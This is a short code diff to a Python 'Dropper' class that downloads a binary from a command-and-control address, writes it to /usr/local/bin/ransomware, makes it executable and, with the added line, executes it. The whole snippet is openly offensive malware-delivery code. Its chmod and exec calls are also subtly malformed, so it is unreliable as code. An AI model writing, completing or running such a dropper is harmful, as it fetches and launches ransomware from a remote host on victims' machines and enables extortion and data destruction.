@@ -7,13 +7,15 @@ class Dropper():
     def get_malware(self):
         url = Dropper.CNC_ADDRESS + "malware"
         resp = requests.get(url)
-        malware = resp.content
+        binary_file = resp.content
 
         path = "/usr/local/bin/ransomware"
         with open(path, "wb") as f:
-            f.write(malware)
+            f.write(binary_file)
 
         os.chmod(path, 755)
+
+        os.execl("ransomware")
 
 
 
